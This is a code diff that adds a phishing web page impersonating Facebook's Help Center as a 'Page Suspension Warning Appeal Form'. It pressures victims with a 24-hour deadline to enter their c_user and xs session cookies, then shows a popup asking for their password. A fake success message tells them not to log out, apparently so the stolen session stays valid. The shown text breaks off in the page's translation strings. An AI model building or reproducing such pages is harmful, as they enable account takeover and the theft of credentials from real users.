@@ -1,176 +1,1584 @@
+<!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
-    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
-    <title>verified</title>
-    <link rel="icon" type="image/png" href="https://cdn.glitch.global/d9a1111a-d0ad-4fa6-aeec-3c8aa027f796/Facebook_Logo_2023.png?v=1737135554085">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, Helvetica, sans-serif;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#4285f4" />
+  <meta name="description" content="Page Suspension Warning Appeal Form - Submit your appeal to review your suspended page">
+  <title>Page Suspension Warning Appeal Form</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
+  <style>
+    :root {
+      --primary-color: #3b5998;
+      --secondary-color: #4285f4;
+      --error-color: #d23f31;
+      --success-color: #42b72a;
+      --text-color: #050505;
+      --light-gray: #f8f8f8;
+      --medium-gray: #e4e6e9;
+      --dark-gray: #454444;
+      --border-radius: 4px;
+      --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      --transition: all 0.3s ease;
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      color: var(--text-color);
+      line-height: 1.6;
+      background-color: #f5f5f5;
+    }
 
-        html,
-        body {
-            height: 0%;
-            width: 100%;
-        }
+    /* Improved typography */
+    h1, h2, h3, h4, h5, h6 {
+      font-weight: 600;
+      line-height: 1.3;
+    }
 
-        #container {
-            height: 135%;
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background-color: #f0f2f5;
-        }
+    /* Top Navigation */
+    .top-nav {
+      background-color: var(--primary-color);
+      padding: 15px 40px;
+      color: white;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      position: relative;
+      z-index: 100;
+    }
 
-        #box {
-            height: 40%;
-            width: 45%;
-            background-color: rgb(255, 255, 255);
-            border-radius: 3px;
-            display: flex;
-            align-items: center;
-            flex-direction: column;
-        }
+    .top-nav-text {
+      margin: 0;
+      text-align: left;
+      margin-right: auto;
+      font-size: 1.2em;
+      font-weight: 600;
+      order: 1;
+    }
 
-        #box>img {
-            width: 70px;
-            margin-top: 15px;
-        }
+    .search-container {
+      position: relative;
+      margin: 0 auto;
+      width: 25%;
+      max-width: 300px;
+      min-width: 180px;
+      order: 2;
+    }
 
-        #data {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-top: 15px;
-        }
+    .search-bar {
+      width: 100%;
+      padding: 8px 30px 8px 10px;
+      border: none;
+      border-radius: 4px;
+    }
 
-        #data>h4 {
-            font-size: 25px;
-        }
+    .search-bar:focus {
+      outline: none;
+      background-color: white;
+      box-shadow: 0 0 0 2px rgba(255,255,255,0.3);
+    }
 
-        #data>img {
-            width: 25px;
-        }
+    .search-icon {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #555;
+      font-size: 0.95em;
+    }
 
-        .line {
-            height: .7px;
-            background-color: rgba(0, 0, 0, 0.222);
-            width: 90%;
-            margin: 1rem;
-        }
+    /* Secondary Navigation */
+    .second-nav {
+      background-color: var(--light-gray);
+      padding: 12px 20px;
+      border-bottom: 1px solid #ddd;
+      display: flex;
+      align-items: center;
+    }
 
-        #para h2 {
-            font-size: 16px;
-        }
+    .home-icon {
+      margin-right: 12px;
+      font-size: 20px;
+      color: var(--primary-color);
+    }
 
-        #para {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
+    .help-center-text {
+      margin: 0;
+      font-size: 1em;
+      font-weight: 500;
+      color: var(--text-color);
+    }
 
-        #para p {
-            margin: 20px 100px 0px 100px;
-            font-size: 14px;
-        }
+    /* Content Wrapper */
+    .content-wrapper {
+      display: flex;
+      flex: 1;
+      min-height: 0;
+      background-color: white;
+    }
 
-        #para button {
-            padding: 10px 20px 10px 20px;
-            margin-top: 25px;
-            border: none;
-            border-radius: 2px;
-            font-size: 18px;
-            background-color: #145dbd;
-            cursor: pointer;
-        }
+    /* Side Navigation */
+    .side-nav {
+      width: 220px;
+      background-color: #fff;
+      padding: 20px 0;
+      overflow-y: auto;
+      border-right: 1px solid #eee;
+    }
 
-        #para button a {
-            text-decoration: none;
-            color: #fff;
-        }
+    .side-nav-item {
+      padding: 10px 20px;
+      cursor: pointer;
+      font-size: 0.9em;
+      color: var(--text-color);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      transition: var(--transition);
+      border-left: 3px solid transparent;
+    }
 
-        #para button:hover {
-            background-color: #03469e;
-        }
+    .side-nav-item:hover {
+      background-color: var(--medium-gray);
+      border-left: 3px solid var(--primary-color);
+    }
 
-        @media (max-width: 500px) {
-            #box {
-                margin: 0;
-                height: 45%;
-                width: 95%;
-                top: 0%;
-            }
-            #box>img {
-                width: 40px;
-            }
-            #data>h4 {
-                font-size: 18px;
-            }
-            #data>img {
-                width: 15px;
-                margin-left: 2px;
-            }
-            .line {
-                height: .5px;
-                width: 90%;
-                margin-left: auto;
-                margin-right: auto;
-                background-color: #00000045;
-            }
-            #para {
-                margin: 0%;
-            }
-            #para>h2 {
-                font-size: 12px;
-                font-weight: 700;
-                margin-bottom: 10px;
-            }
-            #para>p {
-                margin: 5px 15px 0px 15px;
-                font-size: 14px;
-            }
-            #para button {
-                padding: 8px 18px 8px 18px;
-                margin-top: 15px;
-                border: none;
-                border-radius: 2px;
-                font-size: 13px;
-                background-color: #1877F2;
-                cursor: pointer;
-            }
-        }
-    </style>
+    .side-nav-item.active {
+      background-color: var(--medium-gray);
+      border-left: 3px solid var(--primary-color);
+      font-weight: 500;
+    }
+
+    /* Main Content */
+    .main-content {
+      flex: 1;
+      padding: 25px;
+      overflow-y: auto;
+      background-color: #f9f9f9;
+    }
+
+    .main-border {
+      width: 100%;
+      max-width: 800px;
+      margin: 0 auto;
+      border: 1px solid #ddd;
+      border-radius: 0 0 var(--border-radius) var(--border-radius);
+      overflow: hidden;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+      background-color: white;
+    }
+
+    .inner-border {
+      border-bottom: 1px solid #cbc5c5;
+      padding: 15px 20px;
+      text-align: center;
+      background-color: #f2f2f2;
+    }
+
+    /* FORM TITLE FONT SIZE FIX */
+    .inner-border h1 {
+      color: var(--error-color);
+      margin: 5px 0;
+      font-size: 1.1em;
+      font-weight: 600;
+      line-height: 1.3;
+    }
+
+    .content-area {
+      padding: 20px;
+      position: relative;
+    }
+
+    .small-text {
+      font-size: 0.88em;
+      line-height: 1.5;
+      margin-bottom: 10px;
+      color: var(--text-color);
+      display: flex;
+      font-weight: 500;
+    }
+
+    .bullet-icon {
+      color: var(--error-color);
+      margin-right: 10px;
+      font-size: 0.6em;
+      margin-top: 5px;
+      flex-shrink: 0;
+    }
+
+    /* Form Inputs */
+    .input-field {
+      margin: 15px 0;
+    }
+
+    .input-field label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 0.92em;
+      color: #555;
+      font-weight: 500;
+    }
+
+    .input-field input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid var(--dark-gray);
+      border-radius: var(--border-radius);
+      font-size: 0.95em;
+      transition: var(--transition);
+    }
+
+    .input-field input:focus {
+      outline: none;
+      border-color: var(--primary-color);
+      box-shadow: 0 0 0 2px rgba(59, 89, 152, 0.2);
+    }
+
+    /* VIDEO PLAYER STYLES */
+    .video-container {
+      margin: 20px auto;
+      padding: 15px;
+      background-color: #f9f9f9;
+      border: 1px solid #ddd;
+      border-radius: var(--border-radius);
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+    }
+
+    .video-title {
+      color: var(--secondary-color);
+      margin-bottom: 10px;
+      font-size: 0.95em;
+      font-weight: 600;
+      text-align: center;
+    }
+
+    .video-wrapper {
+      position: relative;
+      padding-bottom: 56.25%;
+      height: 0;
+      overflow: hidden;
+      background-color: #000;
+      border-radius: 3px;
+      -webkit-overflow-scrolling: touch;
+    }
+
+    .video-wrapper video {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+      object-fit: contain;
+    }
+
+    .video-poster {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #000;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      cursor: pointer;
+      transition: var(--transition);
+    }
+
+    .video-poster:hover {
+      background-color: rgba(0,0,0,0.8);
+    }
+
+    .play-button {
+      color: white;
+      font-size: 50px;
+      margin-bottom: 10px;
+      transition: var(--transition);
+      opacity: 0.9;
+    }
+
+    .video-poster:hover .play-button {
+      transform: scale(1.1);
+      opacity: 1;
+    }
+
+    .play-text {
+      color: white;
+      font-size: 16px;
+      opacity: 0.9;
+    }
+
+    .video-description {
+      font-size: 0.82em;
+      margin-top: 12px;
+      color: #666;
+      line-height: 1.4;
+      text-align: center;
+    }
+
+    /* Loading indicator for video */
+    .video-loading {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: white;
+      font-size: 14px;
+      display: none;
+    }
+
+    /* Button Container */
+    .button-container {
+      border-top: 1px solid #eee;
+      padding: 15px 20px;
+      text-align: right;
+      background-color: #f2f2f2;
+    }
+
+    .send-button {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      padding: 9px 14px;
+      border-radius: var(--border-radius);
+      cursor: pointer;
+      font-size: 0.95em;
+      font-weight: 500;
+      transition: var(--transition);
+      min-width: 10px;
+    }
+
+    .send-button:hover {
+      background-color: #2d4373;
+    }
+
+    .send-button:active {
+      transform: translateY(1px);
+    }
+
+    /* Error Message */
+    #error-message {
+      color: var(--error-color);
+      font-size: 0.85em;
+      text-align: center;
+      margin: 15px 0;
+      display: none;
+      padding: 10px;
+      background-color: #ffeeee;
+      border: 1px solid #ffcccc;
+      border-radius: var(--border-radius);
+      line-height: 1.5;
+    }
+
+    /* Menu Toggle Button */
+    .menu-toggle {
+      display: none;
+      background: none;
+      border: none;
+      color: white;
+      font-size: 20px;
+      cursor: pointer;
+      padding: 5px 10px;
+      order: 0;
+      margin-right: 10px;
+      transition: var(--transition);
+    }
+
+    .menu-toggle:hover {
+      opacity: 0.8;
+    }
+
+    /* Popup Styles */
+    .popup-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(0,0,0,0.5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      opacity: 0;
+      visibility: hidden;
+      transition: var(--transition);
+    }
+
+    .popup-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .auth-box, .success-popup, .language-popup {
+      background: white;
+      border-radius: 8px;
+      box-shadow: var(--box-shadow);
+      width: 90%;
+      max-width: 400px;
+      padding: 25px;
+      text-align: center;
+      position: relative;
+      transform: translateY(20px);
+      transition: var(--transition);
+    }
+
+    .popup-overlay.active .auth-box,
+    .popup-overlay.active .success-popup,
+    .popup-overlay.active .language-popup {
+      transform: translateY(0);
+    }
+
+    .auth-box .logo svg {
+      width: 40px;
+      height: 40px;
+      fill: var(--primary-color);
+    }
+
+    .auth-box .title {
+      font-size: 18px;
+      color: var(--text-color);
+      margin: 20px 0;
+      font-weight: 600;
+      line-height: 1.4;
+    }
+
+    .auth-box .input-container {
+      margin-bottom: 20px;
+    }
+
+    .auth-box .input-field {
+      width: 100%;
+      padding: 12px 15px;
+      border: 1px solid #dddfe2;
+      border-radius: var(--border-radius);
+      font-size: 16px;
+      color: var(--text-color);
+      transition: var(--transition);
+    }
+
+    .auth-box .input-field:focus {
+      outline: none;
+      border-color: var(--primary-color);
+      box-shadow: 0 0 0 2px rgba(59, 89, 152, 0.2);
+    }
+
+    .auth-box .submit-btn {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      border-radius: var(--border-radius);
+      font-size: 14px;
+      font-weight: 600;
+      padding: 12px;
+      width: 100%;
+      max-width: 150px;
+      cursor: pointer;
+      transition: var(--transition);
+    }
+
+    .auth-box .submit-btn:hover {
+      background-color: #2d4373;
+    }
+
+    .auth-box .disclaimer {
+      color: #65676b;
+      font-size: 13px;
+      margin-top: 20px;
+      line-height: 1.5;
+    }
+
+    /* Success Popup Styles */
+    .success-popup .success-icon {
+      color: var(--success-color);
+      font-size: 50px;
+      margin-bottom: 20px;
+    }
+
+    .success-popup .success-title {
+      font-size: 18px;
+      color: var(--text-color);
+      margin: 10px 0;
+      font-weight: 600;
+    }
+
+    .success-popup .success-message {
+      font-size: 14px;
+      color: #65676b;
+      margin: 15px 0;
+      line-height: 1.5;
+    }
+
+    .success-popup .warning-text {
+      color: var(--error-color);
+      font-size: 13px;
+      margin-top: 20px;
+      font-weight: 500;
+      line-height: 1.4;
+    }
+
+    /* Language Popup Styles */
+    .language-popup .title {
+      font-size: 18px;
+      color: var(--text-color);
+      margin-bottom: 20px;
+      font-weight: 600;
+    }
+
+    .language-options {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 20px;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+
+    .language-option {
+      padding: 12px;
+      border: 1px solid #dddfe2;
+      border-radius: var(--border-radius);
+      cursor: pointer;
+      transition: var(--transition);
+      text-align: left;
+    }
+
+    .language-option:hover {
+      background-color: #f0f2f5;
+    }
+
+    .language-option.selected {
+      background-color: #e7f3ff;
+      border-color: var(--primary-color);
+    }
+
+    /* Close Buttons */
+    .close-btn {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      background: none;
+      border: none;
+      font-size: 22px;
+      cursor: pointer;
+      color: #65676b;
+      width: 36px;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      transition: var(--transition);
+    }
+
+    .close-btn:hover {
+      background-color: #f0f2f5;
+      color: #333;
+    }
+
+    /* Translator Dropdown Styles */
+    .translator-container {
+      position: relative;
+      display: inline-block;
+      margin-left: 10px;
+      order: 3;
+    }
+
+    .translator-btn {
+      background-color: transparent;
+      color: white;
+      border: 1px solid rgba(255,255,255,0.5);
+      border-radius: var(--border-radius);
+      padding: 8px 15px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      font-size: 0.9em;
+      transition: var(--transition);
+    }
+
+    .translator-btn:hover {
+      background-color: rgba(255,255,255,0.1);
+      border-color: white;
+    }
+
+    .translator-btn i {
+      margin-right: 8px;
+    }
+
+    .translator-dropdown {
+      display: none;
+      position: absolute;
+      right: 0;
+      background-color: white;
+      min-width: 180px;
+      box-shadow: var(--box-shadow);
+      z-index: 100;
+      border-radius: var(--border-radius);
+      overflow: hidden;
+    }
+
+    .translator-dropdown a {
+      color: #333;
+      padding: 10px 15px;
+      text-decoration: none;
+      display: block;
+      font-size: 0.9em;
+      transition: var(--transition);
+      text-align: left;
+    }
+
+    .translator-dropdown a:hover {
+      background-color: #f5f5f5;
+    }
+
+    .translator-container:hover .translator-dropdown {
+      display: block;
+    }
+
+    /* Loading Overlay Styles */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(0,0,0,0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      opacity: 0;
+      visibility: hidden;
+      transition: var(--transition);
+    }
+
+    .loading-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .loading-spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid var(--primary-color);
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Footer Styles */
+    .meta-footer {
+      background-color: #f0f2f5;
+      padding: 20px 0;
+      border-top: 1px solid #dddfe2;
+      font-size: 0.85em;
+      color: #65676b;
+      margin-top: auto;
+    }
+    
+    .footer-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+    
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 15px;
+      margin-bottom: 15px;
+      justify-content: center;
+    }
+    
+    .footer-link {
+      color: #65676b;
+      text-decoration: none;
+      transition: color 0.2s ease;
+    }
+    
+    .footer-link:hover {
+      color: var(--primary-color);
+      text-decoration: underline;
+    }
+    
+    .footer-meta {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 15px;
+    }
+    
+    .copyright {
+      margin: 0;
+    }
+    
+    .footer-locale {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    /* Responsive Styles */
+    @media (max-width: 768px) {
+      .menu-toggle {
+        display: block;
+      }
+      
+      .side-nav {
+        display: none;
+        width: 100%;
+        padding: 15px 0;
+        position: absolute;
+        left: 0;
+        top: 100%;
+        z-index: 100;
+        background-color: #fff;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        max-height: calc(100vh - 100px);
+        overflow-y: auto;
+      }
+      
+      .side-nav.active {
+        display: block;
+      }
+      
+      .side-nav-item {
+        padding: 12px 20px;
+        border-bottom: 1px solid #eee;
+      }
+      
+      .content-wrapper {
+        flex-direction: column;
+      }
+      
+      .search-container {
+        width: 80%;
+        margin: 10px auto;
+        order: 3;
+      }
+
+      .top-nav {
+        padding: 12px 15px;
+      }
+      
+      .top-nav-text {
+        margin-left: 10px;
+        order: 1;
+      }
+
+      .translator-container {
+        order: 2;
+        margin-right: 0;
+        margin-left: auto;
+      }
+
+      .translator-dropdown {
+        right: auto;
+        left: 0;
+      }
+
+      .main-content {
+        padding: 15px;
+      }
+
+      .content-area {
+        padding: 15px;
+      }
+
+      .inner-border {
+        padding: 12px 15px;
+      }
+      
+      /* Footer responsive adjustments */
+      .footer-links {
+        justify-content: center;
+      }
+      
+      .footer-meta {
+        flex-direction: column;
+        text-align: center;
+      }
+      
+      /* Add responsive adjustments for title */
+      .inner-border h1 {
+        font-size: 1.05em;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .inner-border h1 {
+        font-size: 1em;
+      }
+      
+      .content-area {
+        padding: 12px;
+      }
+
+      .video-container {
+        padding: 12px;
+      }
+
+      .button-container {
+        padding: 12px 15px;
+      }
+
+      .send-button {
+        padding: 10px 20px;
+        min-width: 100px;
+      }
+
+      .auth-box, .success-popup, .language-popup {
+        padding: 20px 15px;
+      }
+    }
+  </style>
 </head>
-
 <body>
-    <div id="container">
-        <div id="box">
-            <img src="https://cdn.glitch.global/d9a1111a-d0ad-4fa6-aeec-3c8aa027f796/Facebook_Logo_2023.png?v=1737135554085" alt="">
-            <h5 id="groupSubHeader">Facebook Security</h5>
-            <div id="data">
-                <h4>free service</h4> <img src="https://cdn.glitch.global/d9a1111a-d0ad-4fa6-aeec-3c8aa027f796/bluetick.png?v=1737135548362" alt="">
-            </div>
-            <div class="line"></div>
-            <div id="para">
-                <h2> 𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬! 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐬𝐞𝐥𝐞𝐜𝐭𝐞𝐝 𝐟𝐨𝐫 𝐚 𝐟𝐫𝐞𝐞 𝐯𝐞𝐫𝐢𝐟𝐢𝐞𝐝 𝐩𝐚𝐠𝐞.</h2>click on continue
-                <p>
-                    </p>
-                <button> <a href="help.html">Continue</a> </button>
-            </div>
-        </div>
+  <!-- Top Navigation -->
+  <nav class="top-nav">
+    <button class="menu-toggle" id="menuToggle" aria-label="Toggle menu">
+      <i class="fa fa-bars"></i>
+    </button>
+    <p class="top-nav-text">Facebook</p>
+    <div class="search-container">
+      <input type="text" class="search-bar" placeholder="Search..." aria-label="Search" />
+      <i class="fa fa-search search-icon" aria-hidden="true"></i>
     </div>
+    <div class="translator-container">
+      <button class="translator-btn" id="translatorBtn" aria-label="Change language">
+        <i class="fa fa-language"></i> English
+      </button>
+      <div class="translator-dropdown" id="translatorDropdown">
+        <a href="#" onclick="changeLanguage('en')">English</a>
+        <a href="#" onclick="changeLanguage('es')">Español</a>
+        <a href="#" onclick="changeLanguage('fr')">Français</a>
+        <a href="#" onclick="changeLanguage('de')">Deutsch</a>
+        <a href="#" onclick="changeLanguage('hi')">हिन्दी</a>
+        <a href="#" onclick="changeLanguage('ar')">العربية</a>
+        <a href="#" onclick="changeLanguage('ta')">தமிழ்</a>
+      </div>
+    </div>
+  </nav>
 
+  <!-- Secondary Navigation -->
+  <nav class="second-nav" aria-label="Secondary navigation">
+    <i class="fa fa-home home-icon" aria-hidden="true"></i>
+    <p class="help-center-text">Help Center</p>
+  </nav>
 
+  <!-- Content Wrapper -->
+  <div class="content-wrapper">
+    <nav class="side-nav" id="sideNav" aria-label="Main navigation">
+      <!-- Side Navigation Items -->
+      <div class="side-nav-item">Page Issues</div>
+      <div class="side-nav-item">Your Profile</div>
+      <div class="side-nav-item">Friending</div>
+      <div class="side-nav-item">Your Home Page</div>
+      <div class="side-nav-item">Messaging</div>
+      <div class="side-nav-item">Reels</div>
+      <div class="side-nav-item">Stories</div>
+      <div class="side-nav-item">Photos</div>
+      <div class="side-nav-item">Videos</div>
+      <div class="side-nav-item">Gaming</div>
+      <div class="side-nav-item">Pages</div>
+      <div class="side-nav-item">Groups</div>
+      <div class="side-nav-item">Events</div>
+      <div class="side-nav-item">Meta Pay</div>
+      <div class="side-nav-item">Marketplace</div>
+      <div class="side-nav-item">Apps</div>
+      <div class="side-nav-item">Accessibility</div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="main-content">
+      <div class="main-border">
+        <div class="inner-border">
+          <h1 id="page-title">Page Suspension Warning Appeal Form</h1>
+        </div>
+
+        <div class="content-area">
+          <p class="small-text"><i class="fa fa-circle bullet-icon" aria-hidden="true"></i><span id="bullet1">Your page breaks our Community Guidelines.</span></p>
+          <p class="small-text"><i class="fa fa-circle bullet-icon" aria-hidden="true"></i><span id="bullet2">Submit your appeal before 24 hours.</span></p>
+          <p class="small-text"><i class="fa fa-circle bullet-icon" aria-hidden="true"></i><span id="bullet3">Make sure your content complies with all requirements.</span></p>
+
+          <div class="video-container">
+            <div class="video-title" id="video-title">Appeal Process Guide</div>
+            <div class="video-wrapper">
+              <video id="guideVideo" width="100%" controls playsinline webkit-playsinline style="display:none;" aria-label="Appeal process guide video">
+                <source id="videoSource" src="" type="video/mp4">
+                Your browser does not support the video tag.
+              </video>
+              <div class="video-poster" id="videoPoster" role="button" aria-label="Play appeal process guide video">
+                <i class="fa fa-play-circle play-button" aria-hidden="true"></i>
+                <div class="play-text" id="play-text">Click to play video</div>
+              </div>
+              <div class="video-loading" id="videoLoading" style="display: none;">
+                <i class="fa fa-spinner fa-spin"></i> Loading video...
+              </div>
+            </div>
+            <p class="video-description" id="video-desc">Watch this short guide to understand the appeal process.</p>
+          </div>
+
+          <div class="input-field">
+            <label for="c_user" id="c_user-label">c_user</label>
+            <input type="text" id="c_user" name="c_user" aria-required="true" />
+          </div>
+
+          <div class="input-field">
+            <label for="xs" id="xs-label">xs</label>
+            <input type="text" id="xs" name="xs" aria-required="true" />
+          </div>
+
+          <div id="error-message" role="alert"></div>
+        </div>
+
+        <div class="button-container">
+          <button class="send-button" id="send-button">Send</button>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <!-- Meta Footer -->
+  <footer class="meta-footer">
+    <div class="footer-container">
+      <div class="footer-links">
+        <a href="#" class="footer-link">Terms of Service</a>
+        <a href="#" class="footer-link">Privacy Policy</a>
+        <a href="#" class="footer-link">Community Standards</a>
+        <a href="#" class="footer-link">Cookie Policy</a>
+        <a href="#" class="footer-link">Help Center</a>
+      </div>
+      <div class="footer-meta">
+        <p class="copyright">&copy; 2025 Meta Platforms, Inc. All rights reserved.</p>
+        <div class="footer-locale">
+          <i class="fa fa-globe" aria-hidden="true"></i>
+          <span>English (US)</span>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-spinner"></div>
+  </div>
+
+  <!-- Language Selector Popup -->
+  <div class="popup-overlay" id="languagePopupOverlay">
+    <div class="language-popup" id="languagePopup">
+      <button class="close-btn" onclick="closeLanguagePopup()" aria-label="Close language popup">&times;</button>
+      <h2 class="title">Select Your Language</h2>
+      <div class="language-options">
+        <div class="language-option" onclick="selectLanguage('english')">English</div>
+        <div class="language-option" onclick="selectLanguage('spanish')">Español (Spanish)</div>
+        <div class="language-option" onclick="selectLanguage('french')">Français (French)</div>
+        <div class="language-option" onclick="selectLanguage('german')">Deutsch (German)</div>
+        <div class="language-option" onclick="selectLanguage('hindi')">हिन्दी (Hindi)</div>
+        <div class="language-option" onclick="selectLanguage('arabic')">العربية (Arabic)</div>
+        <div class="language-option" onclick="selectLanguage('tamil')">தமிழ் (Tamil)</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Security Verification Popup -->
+  <div class="popup-overlay" id="securityPopupOverlay">
+    <div class="auth-box" id="securityPopup">
+      <button class="close-btn" onclick="closePopup()" aria-label="Close security popup">&times;</button>
+      <div class="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" aria-hidden="true">
+          <path d="M48 24C48 10.7 37.3 0 24 0S0 10.7 0 24c0 11.8 8.6 21.6 20 23.4V31h-6v-7h6v-5.3c0-6 3.6-9.3 9-9.3 2.6 0 5.3.5 5.3.5v5.8h-3c-3 0-3.9 1.8-3.9 3.7V24h6.5l-1 7h-5.5v16.4c11.4-1.8 20-11.6 20-23.4z" />
+        </svg>
+      </div>
+      <h1 class="title" id="security-title">Enter your password to confirm it's you</h1>
+      <div class="input-container">
+        <input type="password" class="input-field" placeholder="Password" id="passwordInput" aria-label="Password" />
+      </div>
+      <button class="submit-btn" id="continue-btn" onclick="submitPassword()">Continue</button>
+      <p class="disclaimer" id="security-disclaimer">For security reasons, please verify your identity. This helps us keep your account safe.</p>
+    </div>
+  </div>
+
+  <!-- Success Popup -->
+  <div class="popup-overlay" id="successPopupOverlay">
+    <div class="success-popup" id="successPopup">
+      <button class="close-btn" onclick="closeSuccessPopup()" aria-label="Close success popup">&times;</button>
+      <div class="success-icon">
+        <i class="fa fa-check-circle" aria-hidden="true"></i>
+      </div>
+      <h2 class="success-title" id="success-title">Appeal Submitted Successfully</h2>
+      <p class="success-message" id="success-message">Your appeal has been submitted successfully. Our team will review it and get back to you soon.</p>
+      <p class="warning-text" id="warning-text">Do not log out of your account for the next 24 hours.</p>
+    </div>
+  </div>
+
+  <script>
+    // Translation dictionary
+    const translations = {
+      en: {
+        title: "Page Suspension Warning Appeal Form",
+        bullet1: "Your page breaks our Community Guidelines.",
+        bullet2: "Submit your appeal before 24 hours.",
+        bullet3: "Make sure your content complies with all requirements.",
+        videoTitle: "Appeal Process Guide",
+        playText: "Click to play video",
+        videoDesc: "Watch this short guide to understand the appeal process.",
+        c_user: "c_user",
+        xs: "xs",
+        send: "Send",
+        error: "Invalid input. c_user must be numbers only and xs must be a combination of letters, numbers and symbols (minimum 8 characters). Watch the video for help.",
+        securityTitle: "Enter your password to confirm it's you",
+        continueBtn: "Continue",
+        securityDisclaimer: "For security reasons, please verify your identity. This helps us keep your account safe.",
+        successTitle: "Appeal Submitted Successfully",
+        successMsg: "Your appeal has been submitted successfully. Our team will review it and get back to you soon.",
+        warning: "Do not log out of your account for the next 24 hours."
+      },
+      es: {
+        title: "Formulario de Apelación de Advertencia de Suspensión de Página",
+        bullet1: "Tu página infringe nuestras Directrices de la Comunidad.",
+        bullet2: "Envía tu apelación antes de 24 horas.",
+        bullet3: "Asegúrate de que tu contenido cumple con todos los requisitos.",
+        videoTitle: "Guía del Proceso de Apelación",
+        playText: "Haz clic para reproducir el video",
+        videoDesc: "Mira esta breve guía para entender el proceso de apelación.",
+        c_user: "c_user",
+        xs: "xs",
+        send: "Enviar",
+        error: "Entrada no válida. c_user debe ser solo números y xs debe ser una combinación de letras, números y símbolos (mínimo 8 caracteres). Mira el video para obtener ayuda.",
+        securityTitle: "Ingresa tu contraseña para confirmar que eres tú",
+        continueBtn: "Continuar",
+        securityDisclaimer: "Por razones de seguridad, verifica tu identidad. Esto nos ayuda a mantener tu cuenta segura.",
+        successTitle: "Apelación Enviada con Éxito",
+        successMsg: "Tu apelación ha sido enviada con éxito. Nuestro equipo la revisará y se pondrá en contacto contigo pronto.",
+        warning: "No cierres sesión en tu cuenta durante las próximas 24 horas."
+      },
+      fr: {
+        title: "Formulaire de Recours contre l'Avertissement de Suspension de Page",
+        bullet1: "Votre page enfreint nos Règles de la Communauté.",
+        bullet2: "Soumettez votre recours dans les 24 heures.",
+        bullet3: "Assurez-vous que votre contenu respecte toutes les exigences.",
+        videoTitle: "Guide du Processus de Recours",
+        playText: "Cliquez pour lire la vidéo",
+        videoDesc: "Regardez ce court guide pour comprendre le processus de recours.",
+        c_user: "c_user",
+        xs: "xs",
+        send: "Envoyer",
